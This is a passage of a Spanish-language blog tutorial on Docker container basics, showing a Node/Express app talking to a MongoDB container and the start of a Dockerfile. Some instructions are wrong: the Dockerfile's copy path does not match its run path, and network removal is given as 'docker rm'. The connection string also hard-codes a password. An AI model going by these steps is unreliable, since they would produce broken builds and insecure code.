&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker24.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora para poder crear nuestro contenedor debemos ejecutar &lt;code&gt;docker create nombre_imagen&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker20.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto nos devuelve un identidicador del contenedor que creamos.&lt;/p&gt;

&lt;p&gt;Ahora tambien podriamos usar el comando &lt;code&gt;docker container create nombre_imagen&lt;/code&gt; para crear un contenedor, pero la forma anterior es mejor ya que lo simplifica.&lt;/p&gt;

&lt;h3 id=&quot;iniciar-un-contenedor&quot;&gt;Iniciar un Contenedor &lt;a href=&quot;#iniciar-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Una vez ya creado nuestro contenedor, debemos iniciarlo para poder levantar el servicio que tengamos corriendo.&lt;/p&gt;

&lt;p&gt;Para ello usamos el comando &lt;code&gt;docker start id_contenedor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker21.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y de la misma manera nos devuelve el propio identificador como respuesta al ejectar el comando indicandonos que se inicio correctamente.&lt;/p&gt;

&lt;h3 id=&quot;listar-un-contenedor&quot;&gt;Listar Contenedores en Ejecución &lt;a href=&quot;#listar-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para poder verificar que el contenedor se inicio de manera correcta tendremos que ejecutar el comando &lt;code&gt;docker ps&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker22.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Este comando nos muestra un consunto de etiquetas que corresponden:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;CONTAINER ID:&lt;/strong&gt; Es el id del contenedor pero simplificado.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;IMAGE:&lt;/strong&gt; Indica en que imagen se baso el contenedor para su creación.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;COMMAND:&lt;/strong&gt; Es el comando que usa el contenedor para ejecutarse.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CREATED:&lt;/strong&gt; Cuando fue creado el contenedor.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;STATUS:&lt;/strong&gt; Indica el estado en el que se encuentra el contenedor.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;PORTS:&lt;/strong&gt; Especifica el puerto del que se hace uso para ejecutar el contenedor.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;NAMES:&lt;/strong&gt; El nombre del contenedor.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;detener-un-contenedor&quot;&gt;Detener un Contenedor &lt;a href=&quot;#detener-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Que paso ahora si queremos detener la ejecución del contenedor, usamos el comando &lt;code&gt;docker stop id_contenedor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker25.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si tratamos ahora a mostrar los contenedores en ejecución, vemos que esta vez no nos devuelve nada debido a que detuvimos el que previamente creamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker26.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sin embargo esto no quiere decir que el contenedor se haya borrado ya que este sigue existiendo.&lt;/p&gt;

&lt;h3 id=&quot;listar-todos-los-contenedores&quot;&gt;Listar todos los Contenedores &lt;a href=&quot;#listar-todos-los-contenedores&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Anteriomente veiamos como listar los contenedores actualmente corriendo, pero que paso si queremos ver los contenedores que tenemos independientemente si estos esten o no activos solo hay que añadir un parametro al anterior comando &lt;code&gt;docker ps -a&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker27.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y esta vez podemos ver las mismas etiquetas, pero con la variación que ahora &lt;code&gt;STATUS&lt;/code&gt; nos muestra un estado &lt;code&gt;Exited (0) 3 min ago&lt;/code&gt; el cual nos indica que el contenedor detuvo su ejecución hace un aproximado de 3 min.&lt;/p&gt;

&lt;p&gt;Ademas debido a que ahora el contenedor no se encuentra activo, la etiqueta &lt;code&gt;PORTS&lt;/code&gt; se encuentra vacia.&lt;/p&gt;

&lt;h3 id=&quot;eliminar-un-contenedor&quot;&gt;Eliminar un Contenedor &lt;a href=&quot;#eliminar-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Si queremos eliminar un contenedor previamente creado y el cual no necesitemos, es super sencillo solo tenemos que ejecutar el comando &lt;code&gt;docker rm id_contenedor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker28.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si litamos ahora el comando que nos lista los contendores disponibles, vemos que fue eliminado exitosamente.&lt;/p&gt;

&lt;h3 id=&quot;establecer-nombre-a-un-contenedor&quot;&gt;Establecer Nombre a un Contenedor &lt;a href=&quot;#establecer-nombre-a-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Cuando listabamos los contenedores notamos que en la etiqueta &lt;code&gt;NAME&lt;/code&gt; se establecia un nombre extraño asignado al contenedor que creabamos, y esto sucede debido a que si nosotros al momento de crear nuestro contenedor no lo establecemos un nombre &lt;code&gt;docker&lt;/code&gt; por defecto lo genera aleatoriamente. Pero existe la posibilidad de nosotros establecer un nombre a nuestro contenedor y trabajar en función a el y no siempre usando el ID.&lt;/p&gt;

&lt;p&gt;Para ello solo debemos agregar el parametro &lt;code&gt;--name nombre_contenedor&lt;/code&gt;, por lo demas el comando seria exactamente igual.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker29.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente seria iniciarlo no?, pero ahora que le asignamos un nombre podemos usar este en lugar del ID. Seguidamente tambien vamos a verificar que nuestro contenedor se encuentra activo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker30.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que tenemos corriendo nuestro contenedor y esta vez con el nombre que le asignamos &lt;code&gt;mongo_container&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Lo ideal seria comenzar a usarlo, y como en nuestro caso corresponde a un servicio de base de datos guardar información. Sin embargo si queremos interactuar con este desde nuestra maquina &lt;code&gt;host&lt;/code&gt; no nos sera posible.&lt;/p&gt;

&lt;p&gt;y de seguro te preguntaras debido a que si nos nuestro contenedor esta funcionando correctamente?.&lt;/p&gt;

&lt;p&gt;Pues esto se debe a que cuando nosotros ejecutamos una aplicación dentro de un contenedor Docker, esta solo puede comunicarse con el mundo exterior a través de la &lt;code&gt;interfaz de red&lt;/code&gt; interna del contenedor, lo que significa que no puede acceder directamente a los puertos del host o a otros dispositivos en la red.&lt;/p&gt;

&lt;p&gt;Entonces para poder establecer esta comunicación usamos el concepto de &lt;code&gt;Port Mapping&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;ejecutar-comandos&quot;&gt;Ejecutar comandos dentro del Contenedor &lt;a href=&quot;#ejecutar-comandos&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Es importante mencionar que existe la opción de ejecutar comandos dentro de nuestro contenedor que se encutra corriendo, lo que es útil cuando queremos realizar tareas como administración o depuración del mismo.&lt;/p&gt;

&lt;p&gt;Para ello usamos el comando &lt;code&gt;docker exec id_contenedor|nombre_contenedor comando&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Como sabemos nuestros contenedores estan basandos en &lt;code&gt;linux&lt;/code&gt; asi que podriamos ejecutar como comando una &lt;code&gt;bash&lt;/code&gt; y podriamos acceder mediante una terminal al contenedor, para ello vamos a crear un nuevo contenedor usando nuestra imagen de &lt;code&gt;mongo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker95.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambien podriamos mostrar la version de &lt;code&gt;mongo&lt;/code&gt; que se esta ejecutando.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker96.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En otras palabras podemos ejecutar cualquier comando que nos permita interactuar con nuestros contenedores.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker97.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;port-mapping&quot;&gt;Port Mapping &lt;a href=&quot;#port-mapping&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;El &lt;code&gt;Port Mapping&lt;/code&gt; nos permite redireccionar solicitudes de un puerto específico en el host hacia un puerto específico dentro del contenedor. Esto hace que la aplicación dentro del contenedor sea accesible desde el host o desde otras máquinas de la red como si estuviera ejecutándose directamente en el host.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker31.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Par poder realizar este proceso de manera practica, primero vamos a proceder a eliminar nuestro contenedor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker32.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a proceder a crear un nuevo contenedor y lo llamaremos de la misma manera que el previo, solo que esta vez para hacer uso del &lt;code&gt;Port Mapping&lt;/code&gt; usaremos un parametro mas &lt;code&gt;-p&lt;/code&gt; - &lt;code&gt;-ppuerto_host:puerto_contenedor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker33.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora en la etiqueta &lt;code&gt;PORT&lt;/code&gt; vemos que nuestro puerto host &lt;code&gt;27017&lt;/code&gt; esta mapeado a el puerto &lt;code&gt;27017&lt;/code&gt; de nuestro contenedor.&lt;/p&gt;

&lt;p&gt;Si ahora hacemos exactamente el mismo proceso, pero esta vez no especificamos nuestro puerto hosts, lo que pasara es que &lt;code&gt;Docker&lt;/code&gt; lo eligira por nosotros aleatoriamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker34.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que esta vez &lt;code&gt;Docker&lt;/code&gt; nos asigno aleatoriamente el puerto &lt;code&gt;49153&lt;/code&gt;. Esto no nos conviene mucho ya que nosotros siempre queremos tener el control de que puerto queremos usar, pero no esta de mas saberlo.&lt;/p&gt;

&lt;h3 id=&quot;mostrar-logs&quot;&gt;Mostrar logs de un Contenedor &lt;a href=&quot;#mostrar-logs&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Si queremos listar los logs de nuestro contenedor, para mostrar los registros con información detallada sobre el funcioamiento correcto o erroneo de nuestro contenedor tambien es muy sencillo, solo basta con ejecutar el comando &lt;code&gt;docker logs monbre_contenedor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker35.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y si ahora queremos listar los &lt;code&gt;logs&lt;/code&gt; pero a la vez mantenernos en escucha de nuevos registros, añadiremos al comando el parametro &lt;code&gt;--follow&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker36.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker37.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;docker-run&quot;&gt;Docker run &lt;a href=&quot;#docker-run&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Hemos estado viendo diversos comandos cuando usamos &lt;code&gt;Docker&lt;/code&gt;, como descargar una imagen, crear y desplegar nuestro contenedor cada uno con su respectivo comando, pero &lt;code&gt;Docker&lt;/code&gt; tambien nos da la opción de hacer todo el proceso en conjunto haciendo uso de un solo comando.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Seguro puedes decir entocnes para que aprendi el resto??.. si literalmente evito hacer tanto embrollo, pues hay que recordar que si bien podemos automatizar el proceso con este comando no quiere decir que en todo momento que uso docker voy a realizar la misma acción, ya que muchas veces vamos a realizar distintas operaciones por separado.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Y bueno para realizar esta operación debemos ejecutar el comando &lt;code&gt;docker run&lt;/code&gt; y este comando basicamente hara 4 operaciones:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Buscar la imagen y si esta no se encuentra la descargara.&lt;/li&gt;
  &lt;li&gt;Crear un Contenedor&lt;/li&gt;
  &lt;li&gt;Iniciar el Contenedor&lt;/li&gt;
  &lt;li&gt;Mostrar los logs en escucha&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para apreciar mejor su funcionamiento, vamos a realizar el proceso entero, asi que vamos a borrar nuestros contenedores actuales.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker38.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Realizamos tambien el borrado de las imagenes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker39.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora ejecutaremos el comando &lt;code&gt;docker run nombre_imagen&lt;/code&gt; y este lo que hara al no encontrar la imagen, sera descargarla para despues crear y iniciar nuestro contenedor, hasta que finalmente nos muestre los logs en escucha&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker41.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker42.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y otra cosa si queremos que nos realize todo el proceso, pero no queremos ver los &lt;code&gt;logs&lt;/code&gt;, solo tenemos que añadir el parametro &lt;code&gt;-d&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker43.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Otra cosa importante es que podemos usar los mismos parametros de antes incluidos en este comando, como asignarle un nombre &lt;code&gt;--name&lt;/code&gt; o usar el &lt;code&gt;Port Mapping&lt;/code&gt; con &lt;code&gt;-p&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;De esta manera tendriamos desplegado nuestro contenendor y listo para poder usarlo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker44.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;conexion-con-un-contenedor&quot;&gt;Conexión con un Contenedor &lt;a href=&quot;#conexion-con-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para poder realizar la conexión de nuestros contenedores, vamos a estar usando &lt;code&gt;NodeJS&lt;/code&gt; y &lt;code&gt;MongoDB&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ejecutaremos un aplicativo simple en &lt;code&gt;NodeJS&lt;/code&gt; que se pueda conectar con un contenedor que esta ejecutando &lt;code&gt;MongoDB&lt;/code&gt; y de este modo al gestionar todo en contenedores no tengamos que descargarnos &lt;code&gt;Mongo&lt;/code&gt; en nuestro maquina &lt;code&gt;hosts&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello a continuación te dejare el codigo de el aplicativo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const express = require(&quot;express&quot;);
const mongoose = require(&quot;mongoose&quot;);
const app = express();

const mongoURI =
  &quot;mongodb://firtsmiracle:firtsmiracle123@localhost:27017/universidad?authSource=admin&quot;;

mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true });

const studentSchema = new mongoose.Schema({
  nombre: { type: String, required: true },
  curso: { type: String, required: true },
  correo: { type: String, required: true },
});

const Student = mongoose.model(&quot;Student&quot;, studentSchema);

app.use(express.json());

// Ruta para crear un estudiante
app.post(&quot;/estudiantes&quot;, async (req, res) =&amp;gt; {
  try {
    const { nombre, curso, correo } = req.body;

    const newStudent = new Student({ nombre, curso, correo });
    const savedStudent = await newStudent.save();

    res.status(201).json(savedStudent);
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: &quot;Error al crear el estudiante.&quot; });
  }
});

// Ruta para listar todos los estudiantes
app.get(&quot;/estudiantes&quot;, async (req, res) =&amp;gt; {
  try {
    const students = await Student.find();
    res.json(students);
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: &quot;Error al obtener los estudiantes.&quot; });
  }
});

// Ruta para eliminar un estudiante por su ID
app.delete(&quot;/estudiantes/:id&quot;, async (req, res) =&amp;gt; {
  try {
    const estudianteId = req.params.id;

    const deletedStudent = await Student.findByIdAndDelete(estudianteId);

    if (deletedStudent) {
      res.json({ message: &quot;Estudiante eliminado exitosamente.&quot; });
    } else {
      res.status(404).json({ message: &quot;Estudiante no encontrado.&quot; });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: &quot;Error al eliminar el estudiante.&quot; });
  }
});

const port = 3000;
app.listen(port, () =&amp;gt; {
  console.log(`Servidor corriendo en http://localhost:${port}`);
});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ello lo primero que tenemos que hacer es dirigirnos a &lt;code&gt;Docker Hub&lt;/code&gt; ya que vamos a necesitar una serie de parametros de configuración al momento de crear nuestro contenedor para acceder a nuestra base de datos.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://hub.docker.com/&quot;&gt;https://hub.docker.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez ahi ya que queremos usar mongo, usamos el buscado, esto nos llevara a otro apartado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker45.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aqui encontraremos una lista de instrucciones para poder configurar nuestro contenedor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker46.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hay que recordar que cada imagen que estemos utilizando necesitara distintos parametros de configuración y en algunos casos no necesitaran ninguno, eso ya dependera del tipo de imagen que estemos utilizando.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Como vamos a estar utilizando una base de datos, necesitaremos un usuario y una contraseña, para ello usaremos unas variables de entorno que las encontraras en la mismo enlace.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker47.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a realizar el proceso completo, para poder ejecutar nuestro contenedor con las configuraciones necesarias.&lt;/p&gt;

&lt;p&gt;Primero tenemos que tener nuestra imagen descargada de &lt;code&gt;Docker&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker48.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora procederemos a crear el contenedor, con las variables de entorno necesarias para conectarnos. Como vimos en &lt;code&gt;Docker Hub&lt;/code&gt; para setearlas usamos el parametro &lt;code&gt;-e&lt;/code&gt; y usamos adicionalmente los comandos que ya aprendimos previamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker49.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que tenemos correctamente desplegado nuestro contenedor de mongo, vamos a ejecutar la aplicación de &lt;code&gt;NodeJS&lt;/code&gt; en nuestro sistema.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker50.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que se ejecuta por el puerto &lt;code&gt;3000&lt;/code&gt; y si vamos en el navegador el servicio esta activo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker51.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que el servidor esta escuchando vamos a mandar una petición para crear un estudiante.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker52.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La isntrucción se ejecuta correctamente y si ahora vemos en el navegador el registro se realizo correctamente.
&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker53.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos probar a ejecutar otro registro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker54.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Validamos nuevamente y vemos que se visualiza correctamente,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker55.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo mismo si eliminamos algun registro y validamos al listar los cambios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker56.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker57.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera habriamos realizado de manera exitosa una conexión de nuestro aplicativo con un contenedor que ejecuta &lt;code&gt;mongoDB&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;insertar-aplicacion-en-un-contenedor&quot;&gt;Insertar Aplicación en un Contenedor &lt;a href=&quot;#insertar-aplicacion-en-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Ahora ya validamos que podemos conectar nuestra aplicación con un contenedor, pero es posible que podamos meter nuestra aplicación a un contenedor?&lt;/p&gt;

&lt;p&gt;Pues si y para ello primero crear una imagen a partir de un archivo de nombre &lt;code&gt;Dockerfile&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;crear-una-imagen&quot;&gt;Crear una imagen &lt;a href=&quot;#crear-una-imagen&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para poder crear una imagen necesariamente debemos de crear un archivo &lt;code&gt;dockerfile&lt;/code&gt; en donde escribiremos todas las instrucciones que necesitara nuestro contenedor para poder crearse.&lt;/p&gt;

&lt;p&gt;Ahora debo mencionar que para crear una imagen debemos de basarnos en otra imagen, ya que estamos usando &lt;code&gt;Node&lt;/code&gt; pues debemos basarnos en esta misma.&lt;/p&gt;

&lt;h3 id=&quot;dockerfile&quot;&gt;Dockerfile &lt;a href=&quot;#dockerfile&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;Dokerfile: es un archivo de texto plano que contiene una serie de instrucciones que Docker utiliza para crear una imagen de contenedor.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Creamos nuestro archivo &lt;code&gt;Dockerfile&lt;/code&gt; y introducimos los siguientes comandos, te explicare para que funciona cada uno mientras escribimos linea por linea.&lt;/p&gt;

&lt;p&gt;Primero usaremos &lt;code&gt;FROM imagen:version&lt;/code&gt; para indicarle en que imagen nos basaremos, en nuestro caso ya que estamos usando la ultima versión disponible y esta corresponde a la &lt;code&gt;18&lt;/code&gt;, debemos especificarla.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues vamos a crear una carpeta en donde vamos a introdir el codigo fuente de nuestro aplicativo eso lo hacemos con: &lt;code&gt;RUN mkdir -p ruta&lt;/code&gt;. Ojo la &lt;code&gt;ruta&lt;/code&gt; hace referencia a la del contenedor no a la de tu equipo local, y puedes elegir la que quieras.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
RUN mkdir -p /home/myapp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora tenemos que indicarle la ruta de donde va a introducir el codigo y para ello usamos &lt;code&gt;COPY ruta_origen ruta_destino&lt;/code&gt;. Donde especifico en la ruta local un punto ya que tomare como referencia el directorio actual.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
RUN mkdir -p /home/myapp
COPY . /home/myapp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente tenemos que exponer un puerto, para que otros contenedores y nuestra maquina host podamos conectarnos a este nuevo contenedor, para esto usamos &lt;code&gt;EXPOSE puerto&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
RUN mkdir -p /home/myapp
COPY . /home/app
EXPOSE 3000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora finalmente debemos indicarle el comando que se debe ejecutar para que la aplicación corra con &lt;code&gt;CMD [&quot;comando&quot;, &quot;ruta_archivo&quot;]&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
RUN mkdir -p /home/myapp
COPY . /home/app
EXPOSE 3000
CMD [&quot;node&quot;, &quot;/home/myapp/index.js&quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;creacion-de-una-red&quot;&gt;Creación de una Red &lt;a href=&quot;#creacion-de-una-red&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para que nuestros contenedores puedan conectarse, esto debido a que si bien es cierto podemos tener muchos contenedores, no necesariamente todos ellos deben poder conectarse. Y para que nuestro contenedores se puedan conectar debemos crear valga la redundancia una &lt;code&gt;red interna&lt;/code&gt; que realize la conexión de dos o mas contenedores.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Todos los contenedores que se encuentren en la misma red, pueden conectarse y podemos crear cuantas redes queramos.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;docker-network&quot;&gt;Docker Network &lt;a href=&quot;#docker-network&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para realizar la creación de una red, debemos ejecutar el comando &lt;code&gt;docker network&lt;/code&gt; y podemos ver una serie de parametros que podemos utilizar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker58.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentro de esos parametros que podemos hacer uso, podemos ver uno que corresponde a &lt;code&gt;ls&lt;/code&gt;, el cual nos permitira listar las redes disponibles creadas por defecto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker59.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos ahora a crear nuestra nueva red usando el comando &lt;code&gt;docker network create nombre_red&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker60.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al listar nuevamente vemos que ahora tenemos una nueva red &lt;code&gt;redInterna&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Y si te preguntas podemos eliminar una red pues si para ello usamos &lt;code&gt;docker rm nombre_red&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ahora cuando los contenedores estan dentro de la misma red se comunican mediante el nombre del contenedor. En otras palabras el nombre de dominio del contenedor va a ser el mismo al nombre que le damos cuando lo creamos.&lt;/p&gt;

